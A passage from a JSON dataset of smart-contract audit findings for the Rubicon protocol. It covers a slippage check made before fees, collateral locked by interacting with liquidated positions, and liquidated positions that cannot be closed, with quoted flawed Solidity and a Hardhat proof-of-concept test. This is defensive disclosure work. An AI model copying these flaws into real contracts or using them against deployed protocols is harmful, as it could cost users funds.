        "poc": "## Proof of Concept\nRubiconMarket.sellAllAmount function have price protection. User should provide `min_fill_amount` param to that function in order to limit minimum amount he would like to receive.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\nWhen order is filling in this function, full [offer amount is added](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1051) to `fill_amt` param.\n`fill_amt` is the filled amount without fees. Fees [will be decreased](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1066) in the end of function.\nBut slippage [is checked before](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1065) fees are removed.\n\nThis is incorrect, as user will provide `min_fill_amount` that he wants to receive after all fees.\n\nThe same problem exists for RubiconMarket.buyAllAmount.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1112\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVsCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1112\n\n\n# Vulnerability details\n\n## Impact\nRubiconMarket checks slippage incorrectly, user can loose funds because of that.\n\n## Proof of Concept\nRubiconMarket.sellAllAmount function have price protection. User should provide `min_fill_amount` param to that function in order to limit minimum amount he would like to receive.\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\nWhen order is filling in this function, full [offer amount is added](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1051) to `fill_amt` param.\n`fill_amt` is the filled amount without fees. Fees [will be decreased](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1066) in the end of function.\nBut slippage [is checked before](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1065) fees are removed.\n\nThis is incorrect, as user will provide `min_fill_amount` that he wants to receive after all fees.\n\nThe same problem exists for RubiconMarket.buyAllAmount.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nFirst calculate amount without fees, then check slippage.\n```solidity\nfill_amt = calcAmountAfterFee(fill_amt);\nrequire(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n```\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 670,
      "page_start": null,
      "heading": "670. Position contract allows to interact with positions that are liquidated",
      "heading_cleaned": "Position contract allows to interact with positions that are liquidated",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L239\n\n\n# Vulnerability details\n\n## Impact\nPosition contract allows to interact with positions that are liquidated. Because of that user can loose funds.\n\n## Proof of Concept\nWhen new position is created, then amount of tokens that were supplied as collateral [is saved](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L412) as well.\nLater, when user wants to close position, he will [redeem that amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220).\nIn case if user wants to add collateral to avoid liquidation or for any other reason, he can call `increaseMargin`, which will [increase his bath token amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L238) that is used as collateral for the position.\n\nIn case if Position bathToken collateral is liquidated, that means that his debt becomes 0 and if he will call `closePosition`, then the call will revert as it will need to [`redeem`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220) bathToken amount that Position contract doesn't control anymore.\n\nSo in case if user will call `increaseMargin`, just after he was liquidated, then his provided collateral will never be possible to withdraw as `closePosition` will always revert.\n\nExample.\n1.User has open position for bathUSDC, with amount of 1000 bathUSDC.\n2.His position is under liquidation so he wants to `increaseMargin` with more 100 usdc.\n3.liquidation happens before `increaseMargin` was called, so Position contract bathUSDC balance is 0 now and `increaseMargin` mints 100 more bathUSDC.\n4.`increaseMargin` increased position's bath amount to 1100.\n5.user realized that he couldn't save position and now wants to get back collateral, he calls `closePosition`\n6.`closePosition` revert when reddeming as Position contract doesn't have 1100 bathUSDC, only 100.\n\nAs result user's 100 usdc are locked and can be used only as collateral for borrowing.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nDo not allow users to interact with liquidated positions.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L239\n\n\n# Vulnerability details\n\n## Impact\nPosition contract allows to interact with positions that are liquidated. Because of that user can loose funds.\n\n## Proof of Concept\nWhen new position is created, then amount of tokens that were supplied as collateral [is saved](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L412) as well.\nLater, when user wants to close position, he will [redeem that amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220).\nIn case if user wants to add collateral to avoid liquidation or for any other reason, he can call `increaseMargin`, which will [increase his bath token amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L238) that is used as collateral for the position.\n\nIn case if Position bathToken collateral is liquidated, that means that his debt becomes 0 and if he will call `closePosition`, then the call will revert as it will need to [`redeem`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220) bathToken amount that Position contract doesn't control anymore.\n\nSo in case if user will call `increaseMargin`, just after he was liquidated, then his provided collateral will never be possible to withdraw as `closePosition` will always revert.\n\nExample.\n1.User has open position for bathUSDC, with amount of 1000 bathUSDC.\n2.His position is under liquidation so he wants to `increaseMargin` with more 100 usdc.\n3.liquidation happens before `increaseMargin` was called, so Position contract bathUSDC balance is 0 now and `increaseMargin` mints 100 more bathUSDC.\n4.`increaseMargin` increased position's bath amount to 1100.\n5.user realized that he couldn't save position and now wants to get back collateral, he calls `closePosition`\n6.`closePosition` revert when reddeming as Position contract doesn't have 1100 bathUSDC, only 100.\n\nAs result user's 100 usdc are locked and can be used only as collateral for borrowing.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nDo not allow users to interact with liquidated positions.",
      "description": null,
      "impact": "## Impact\nPosition contract allows to interact with positions that are liquidated. Because of that user can loose funds.\n",
      "mitigation": "## Recommended Mitigation Steps\nDo not allow users to interact with liquidated positions.\n",
      "poc": "## Proof of Concept\nWhen new position is created, then amount of tokens that were supplied as collateral [is saved](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L412) as well.\nLater, when user wants to close position, he will [redeem that amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220).\nIn case if user wants to add collateral to avoid liquidation or for any other reason, he can call `increaseMargin`, which will [increase his bath token amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L238) that is used as collateral for the position.\n\nIn case if Position bathToken collateral is liquidated, that means that his debt becomes 0 and if he will call `closePosition`, then the call will revert as it will need to [`redeem`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220) bathToken amount that Position contract doesn't control anymore.\n\nSo in case if user will call `increaseMargin`, just after he was liquidated, then his provided collateral will never be possible to withdraw as `closePosition` will always revert.\n\nExample.\n1.User has open position for bathUSDC, with amount of 1000 bathUSDC.\n2.His position is under liquidation so he wants to `increaseMargin` with more 100 usdc.\n3.liquidation happens before `increaseMargin` was called, so Position contract bathUSDC balance is 0 now and `increaseMargin` mints 100 more bathUSDC.\n4.`increaseMargin` increased position's bath amount to 1100.\n5.user realized that he couldn't save position and now wants to get back collateral, he calls `closePosition`\n6.`closePosition` revert when reddeming as Position contract doesn't have 1100 bathUSDC, only 100.\n\nAs result user's 100 usdc are locked and can be used only as collateral for borrowing.\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L239\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVsCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nPosition contract allows to interact with positions that are liquidated. Because of that user can loose funds.\n",
        "recommendation": "## Recommended Mitigation Steps\nDo not allow users to interact with liquidated positions.\n",
        "poc": "## Proof of Concept\nWhen new position is created, then amount of tokens that were supplied as collateral [is saved](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L412) as well.\nLater, when user wants to close position, he will [redeem that amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220).\nIn case if user wants to add collateral to avoid liquidation or for any other reason, he can call `increaseMargin`, which will [increase his bath token amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L238) that is used as collateral for the position.\n\nIn case if Position bathToken collateral is liquidated, that means that his debt becomes 0 and if he will call `closePosition`, then the call will revert as it will need to [`redeem`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220) bathToken amount that Position contract doesn't control anymore.\n\nSo in case if user will call `increaseMargin`, just after he was liquidated, then his provided collateral will never be possible to withdraw as `closePosition` will always revert.\n\nExample.\n1.User has open position for bathUSDC, with amount of 1000 bathUSDC.\n2.His position is under liquidation so he wants to `increaseMargin` with more 100 usdc.\n3.liquidation happens before `increaseMargin` was called, so Position contract bathUSDC balance is 0 now and `increaseMargin` mints 100 more bathUSDC.\n4.`increaseMargin` increased position's bath amount to 1100.\n5.user realized that he couldn't save position and now wants to get back collateral, he calls `closePosition`\n6.`closePosition` revert when reddeming as Position contract doesn't have 1100 bathUSDC, only 100.\n\nAs result user's 100 usdc are locked and can be used only as collateral for borrowing.\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L239\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVsCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L239\n\n\n# Vulnerability details\n\n## Impact\nPosition contract allows to interact with positions that are liquidated. Because of that user can loose funds.\n\n## Proof of Concept\nWhen new position is created, then amount of tokens that were supplied as collateral [is saved](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L412) as well.\nLater, when user wants to close position, he will [redeem that amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220).\nIn case if user wants to add collateral to avoid liquidation or for any other reason, he can call `increaseMargin`, which will [increase his bath token amount](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L238) that is used as collateral for the position.\n\nIn case if Position bathToken collateral is liquidated, that means that his debt becomes 0 and if he will call `closePosition`, then the call will revert as it will need to [`redeem`](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L220) bathToken amount that Position contract doesn't control anymore.\n\nSo in case if user will call `increaseMargin`, just after he was liquidated, then his provided collateral will never be possible to withdraw as `closePosition` will always revert.\n\nExample.\n1.User has open position for bathUSDC, with amount of 1000 bathUSDC.\n2.His position is under liquidation so he wants to `increaseMargin` with more 100 usdc.\n3.liquidation happens before `increaseMargin` was called, so Position contract bathUSDC balance is 0 now and `increaseMargin` mints 100 more bathUSDC.\n4.`increaseMargin` increased position's bath amount to 1100.\n5.user realized that he couldn't save position and now wants to get back collateral, he calls `closePosition`\n6.`closePosition` revert when reddeming as Position contract doesn't have 1100 bathUSDC, only 100.\n\nAs result user's 100 usdc are locked and can be used only as collateral for borrowing.\n## Tools Used\nVsCode\n## Recommended Mitigation Steps\nDo not allow users to interact with liquidated positions.\n",
      "metadata": {
        "Severity": "Medium",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 683,
      "page_start": null,
      "heading": "683. A liquidated position possibly cannot be closed",
      "heading_cleaned": "A liquidated position possibly cannot be closed",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L382-L397\n\n\n# Vulnerability details\n\n## Vulnerability details\n\nThe Compound V2 protocol is a lending protocol that allows users to supply collaterals in order to borrow other assets (possibly the collateral itself). If a user's position gets undercollateralized, the user will get liquidated (i.e. a liquidator can seize some of their collateral, while repaying also part of their debt.)\n\nThe problem is that, if a user's created margin position gets liquidated, it is not possible to close said position, at least not without disrupting other positions alongside that.\n\nThis is because the function `closePosition()` will attempt to close the position *using the full amount* it has been provided when opening. In other words, the contract never got the info if any liquidations happened, and will attempt to explicitly undo the position in addition to closing it.\n\n## Proof of concept\n\nWe will use `test/hardhat-tests/leverage-wrapper.ts` for the POC.\n- Firstly, we want more data returned from the fixture. Modify the following lines from the fixture as follow:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/test/hardhat-tests/leverage-wrapper.ts#L194-L203\n\n```typescript\nreturn {\n  rubiconMarket,\n  testCoin,\n  cToken,\n  owner,\n  otherAccount,\n  testStableCoin,\n  cTokenStable,\n  Position,\n  priceOracle, // add this\n  comptroller, // add this\n};\n```\n\n- Then, paste the following test:\n\n```typescript\ndescribe(\"Liquidated position bug\", function () {\n  it(\"POC\", async function () {\n    const { owner, testCoin, testStableCoin, cToken, cTokenStable, Position, otherAccount, priceOracle, comptroller } = await loadFixture(\n      deployPoolsUtilityFixture\n    ); // I really went all out on this didn't I?\n\n    // assert that, initially, the Position contract holds no cTokens\n    expect(await cToken.balanceOf(Position.address)).to.be.eq(0);\n\n    // let's first open a long position with 2x margin\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      x2_332\n    );\n\n    // now drop the price to half\n    await priceOracle.addCtoken(cToken.address, parseUnits(\"0.5\", 18));\n\n    // caveat: gotta set the close factor and liq incentive first\n    await comptroller.connect(owner)._setCloseFactor(parseUnits(\"0.5\"));\n    await comptroller.connect(owner)._setLiquidationIncentive(parseUnits(\"0.1\"));\n\n    // now fund otherAccount with some testStableCoin, and liquidate\n    await testStableCoin.connect(otherAccount).faucet();\n    await testStableCoin.connect(otherAccount).approve(cTokenStable.address, parseUnits(\"100000\")); // excess approval is fine\n    await cTokenStable.connect(otherAccount).liquidateBorrow(Position.address, parseUnits(\"12\", 6), cToken.address); // liquidated!\n\n    // now attempt to close the position, but fail\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n\n    // however, the position contract still have cToken, but also positive debt\n    expect(await cToken.balanceOf(Position.address)).to.be.gt(0);\n    expect(await cTokenStable.borrowBalanceStored(Position.address)).to.be.gt(0);\n  });\n});\n```\n\n## Impact\n\nIt is worth noting that the funds *can* still be recovered. This is because Compound exposes a function `repayBehalf` allowing the user to repay on behalf of `Position`, and `Position` itself exposes a function `withdraw` allowing users to withdraw their CTokens directly and redeem.\n- However, this defeats the purpose of `Position` contract, when the users are forced to manage their margin positions *for the Position contract*, as opposed to the contract doing so for them.\n\nThe most serious impact here we believe is not the difficult recover of funds, but in affecting/misleading user decisions when managing their margin portfolio. During a liquidation, an asset is repaid to seize another asset. If two assets that are seized belongs to two *different* positions, a \"technically liquidated\" position can be withdraw, but leaving other positions at risk. In other words, the impossibility of closing a position will cause mismanagement, which is the opposite of what `Position` is trying to achieve.\n\n## Tools used\n\nManual review + Hardhat for POC/testing\n\n## Recommended mitigation\n\nThis is a very difficult problem to address due to its nature as a business logic problem. At the very least it is not possible to tell whether \"a position was liquidated\", due to the way cross-margin positionings work.\n\nWe suggest exposing the following extra functionalities to address the immediate problem:\n- A \"close position given margin\" function, quite literally the opposite counterpart of \"open position\" function: The user is able to supply an amount of borrow to repay, an amount of collateral to withdraw, and an initial margin. The function calculates the loopings needed to repay/withdraw the required amount, and possibly performs them.\n    - The point here is the ability to close positions that have not been opened. If a position gets liquidated, there is no way for the `Position` contract to tell and manage its own portfolio accordingly.\n- A function to close a position *without* un-looping the position. This allows users to freely close positions that they recognize are no longer applicable.\n",
      "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L382-L397\n\n\n# Vulnerability details\n\n## Vulnerability details\n\nThe Compound V2 protocol is a lending protocol that allows users to supply collaterals in order to borrow other assets (possibly the collateral itself). If a user's position gets undercollateralized, the user will get liquidated (i.e. a liquidator can seize some of their collateral, while repaying also part of their debt.)\n\nThe problem is that, if a user's created margin position gets liquidated, it is not possible to close said position, at least not without disrupting other positions alongside that.\n\nThis is because the function `closePosition()` will attempt to close the position *using the full amount* it has been provided when opening. In other words, the contract never got the info if any liquidations happened, and will attempt to explicitly undo the position in addition to closing it.\n\n## Proof of concept\n\nWe will use `test/hardhat-tests/leverage-wrapper.ts` for the POC.\n- Firstly, we want more data returned from the fixture. Modify the following lines from the fixture as follow:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/test/hardhat-tests/leverage-wrapper.ts#L194-L203\n\n```typescript\nreturn {\n  rubiconMarket,\n  testCoin,\n  cToken,\n  owner,\n  otherAccount,\n  testStableCoin,\n  cTokenStable,\n  Position,\n  priceOracle, // add this\n  comptroller, // add this\n};\n```\n\n- Then, paste the following test:\n\n```typescript\ndescribe(\"Liquidated position bug\", function () {\n  it(\"POC\", async function () {\n    const { owner, testCoin, testStableCoin, cToken, cTokenStable, Position, otherAccount, priceOracle, comptroller } = await loadFixture(\n      deployPoolsUtilityFixture\n    ); // I really went all out on this didn't I?\n\n    // assert that, initially, the Position contract holds no cTokens\n    expect(await cToken.balanceOf(Position.address)).to.be.eq(0);\n\n    // let's first open a long position with 2x margin\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      x2_332\n    );\n\n    // now drop the price to half\n    await priceOracle.addCtoken(cToken.address, parseUnits(\"0.5\", 18));\n\n    // caveat: gotta set the close factor and liq incentive first\n    await comptroller.connect(owner)._setCloseFactor(parseUnits(\"0.5\"));\n    await comptroller.connect(owner)._setLiquidationIncentive(parseUnits(\"0.1\"));\n\n    // now fund otherAccount with some testStableCoin, and liquidate\n    await testStableCoin.connect(otherAccount).faucet();\n    await testStableCoin.connect(otherAccount).approve(cTokenStable.address, parseUnits(\"100000\")); // excess approval is fine\n    await cTokenStable.connect(otherAccount).liquidateBorrow(Position.address, parseUnits(\"12\", 6), cToken.address); // liquidated!\n\n    // now attempt to close the position, but fail\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n\n    // however, the position contract still have cToken, but also positive debt\n    expect(await cToken.balanceOf(Position.address)).to.be.gt(0);\n    expect(await cTokenStable.borrowBalanceStored(Position.address)).to.be.gt(0);\n  });\n});\n```\n\n## Impact\n\nIt is worth noting that the funds *can* still be recovered. This is because Compound exposes a function `repayBehalf` allowing the user to repay on behalf of `Position`, and `Position` itself exposes a function `withdraw` allowing users to withdraw their CTokens directly and redeem.\n- However, this defeats the purpose of `Position` contract, when the users are forced to manage their margin positions *for the Position contract*, as opposed to the contract doing so for them.\n\nThe most serious impact here we believe is not the difficult recover of funds, but in affecting/misleading user decisions when managing their margin portfolio. During a liquidation, an asset is repaid to seize another asset. If two assets that are seized belongs to two *different* positions, a \"technically liquidated\" position can be withdraw, but leaving other positions at risk. In other words, the impossibility of closing a position will cause mismanagement, which is the opposite of what `Position` is trying to achieve.\n\n## Tools used\n\nManual review + Hardhat for POC/testing\n\n## Recommended mitigation\n\nThis is a very difficult problem to address due to its nature as a business logic problem. At the very least it is not possible to tell whether \"a position was liquidated\", due to the way cross-margin positionings work.\n\nWe suggest exposing the following extra functionalities to address the immediate problem:\n- A \"close position given margin\" function, quite literally the opposite counterpart of \"open position\" function: The user is able to supply an amount of borrow to repay, an amount of collateral to withdraw, and an initial margin. The function calculates the loopings needed to repay/withdraw the required amount, and possibly performs them.\n    - The point here is the ability to close positions that have not been opened. If a position gets liquidated, there is no way for the `Position` contract to tell and manage its own portfolio accordingly.\n- A function to close a position *without* un-looping the position. This allows users to freely close positions that they recognize are no longer applicable.\n",
      "description": null,
      "impact": "## Impact\n\nIt is worth noting that the funds *can* still be recovered. This is because Compound exposes a function `repayBehalf` allowing the user to repay on behalf of `Position`, and `Position` itself exposes a function `withdraw` allowing users to withdraw their CTokens directly and redeem.\n- However, this defeats the purpose of `Position` contract, when the users are forced to manage their margin positions *for the Position contract*, as opposed to the contract doing so for them.\n\nThe most serious impact here we believe is not the difficult recover of funds, but in affecting/misleading user decisions when managing their margin portfolio. During a liquidation, an asset is repaid to seize another asset. If two assets that are seized belongs to two *different* positions, a \"technically liquidated\" position can be withdraw, but leaving other positions at risk. In other words, the impossibility of closing a position will cause mismanagement, which is the opposite of what `Position` is trying to achieve.\n",
      "mitigation": "## Recommended mitigation\n\nThis is a very difficult problem to address due to its nature as a business logic problem. At the very least it is not possible to tell whether \"a position was liquidated\", due to the way cross-margin positionings work.\n\nWe suggest exposing the following extra functionalities to address the immediate problem:\n- A \"close position given margin\" function, quite literally the opposite counterpart of \"open position\" function: The user is able to supply an amount of borrow to repay, an amount of collateral to withdraw, and an initial margin. The function calculates the loopings needed to repay/withdraw the required amount, and possibly performs them.\n    - The point here is the ability to close positions that have not been opened. If a position gets liquidated, there is no way for the `Position` contract to tell and manage its own portfolio accordingly.\n- A function to close a position *without* un-looping the position. This allows users to freely close positions that they recognize are no longer applicable.\n",
      "poc": "## Proof of concept\n\nWe will use `test/hardhat-tests/leverage-wrapper.ts` for the POC.\n- Firstly, we want more data returned from the fixture. Modify the following lines from the fixture as follow:\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/test/hardhat-tests/leverage-wrapper.ts#L194-L203\n\n```typescript\nreturn {\n  rubiconMarket,\n  testCoin,\n  cToken,\n  owner,\n  otherAccount,\n  testStableCoin,\n  cTokenStable,\n  Position,\n  priceOracle, // add this\n  comptroller, // add this\n};\n```\n\n- Then, paste the following test:\n\n```typescript\ndescribe(\"Liquidated position bug\", function () {\n  it(\"POC\", async function () {\n    const { owner, testCoin, testStableCoin, cToken, cTokenStable, Position, otherAccount, priceOracle, comptroller } = await loadFixture(\n      deployPoolsUtilityFixture\n    ); // I really went all out on this didn't I?\n\n    // assert that, initially, the Position contract holds no cTokens\n    expect(await cToken.balanceOf(Position.address)).to.be.eq(0);\n\n    // let's first open a long position with 2x margin\n    await Position.connect(owner).buyAllAmountWithLeverage(\n      testCoin.address,\n      testStableCoin.address,\n      TEST_AMOUNT,\n      x2_332\n    );\n\n    // now drop the price to half\n    await priceOracle.addCtoken(cToken.address, parseUnits(\"0.5\", 18));\n\n    // caveat: gotta set the close factor and liq incentive first\n    await comptroller.connect(owner)._setCloseFactor(parseUnits(\"0.5\"));\n    await comptroller.connect(owner)._setLiquidationIncentive(parseUnits(\"0.1\"));\n\n    // now fund otherAccount with some testStableCoin, and liquidate\n    await testStableCoin.connect(otherAccount).faucet();\n    await testStableCoin.connect(otherAccount).approve(cTokenStable.address, parseUnits(\"100000\")); // excess approval is fine\n    await cTokenStable.connect(otherAccount).liquidateBorrow(Position.address, parseUnits(\"12\", 6), cToken.address); // liquidated!\n\n    // now attempt to close the position, but fail\n    await expect(Position.connect(owner).closePosition(1)).to.be.reverted;\n\n    // however, the position contract still have cToken, but also positive debt\n    expect(await cToken.balanceOf(Position.address)).to.be.gt(0);\n    expect(await cTokenStable.borrowBalanceStored(Position.address)).to.be.gt(0);\n  });\n});\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L210-L223\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L382-L397\n\n**container:**\n# Vulnerability details\n## Vulnerability details\n\nThe Compound V2 protocol is a lending protocol that allows users to supply collaterals in order to borrow other assets (possibly the collateral itself). If a user's position gets undercollateralized, the user will get liquidated (i.e. a liquidator can seize some of their collateral, while repaying also part of their debt.)\n\nThe problem is that, if a user's created margin position gets liquidated, it is not possible to close said position, at least not without disrupting other positions alongside that.\n\nThis is because the function `closePosition()` will attempt to close the position *using the full amount* it has been provided when opening. In other words, the contract never got the info if any liquidations happened, and will attempt to explicitly undo the position in addition to closing it.\n\n**tools_used:**\n## Tools used\n\nManual review + Hardhat for POC/testing\n",
      "sections": {
        "description": null,
        "impact": "## Impact\n\nIt is worth noting that the funds *can* still be recovered. This is because Compound exposes a function `repayBehalf` allowing the user to repay on behalf of `Position`, and `Position` itself exposes a function `withdraw` allowing users to withdraw their CTokens directly and redeem.\n- However, this defeats the purpose of `Position` contract, when the users are forced to manage their margin positions *for the Position contract*, as opposed to the contract doing so for them.\n\nThe most serious impact here we believe is not the difficult recover of funds, but in affecting/misleading user decisions when managing their margin portfolio. During a liquidation, an asset is repaid to seize another asset. If two assets that are seized belongs to two *different* positions, a \"technically liquidated\" position can be withdraw, but leaving other positions at risk. In other words, the impossibility of closing a position will cause mismanagement, which is the opposite of what `Position` is trying to achieve.\n",
        "recommendation": "## Recommended mitigation\n\nThis is a very difficult problem to address due to its nature as a business logic problem. At the very least it is not possible to tell whether \"a position was liquidated\", due to the way cross-margin positionings work.\n\nWe suggest exposing the following extra functionalities to address the immediate problem:\n- A \"close position given margin\" function, quite literally the opposite counterpart of \"open position\" function: The user is able to supply an amount of borrow to repay, an amount of collateral to withdraw, and an initial margin. The function calculates the loopings needed to repay/withdraw the required amount, and possibly performs them.\n    - The point here is the ability to close positions that have not been opened. If a position gets liquidated, there is no way for the `Position` contract to tell and manage its own portfolio accordingly.\n- A function to close a position *without* un-looping the position. This allows users to freely close positions that they recognize are no longer applicable.\n",
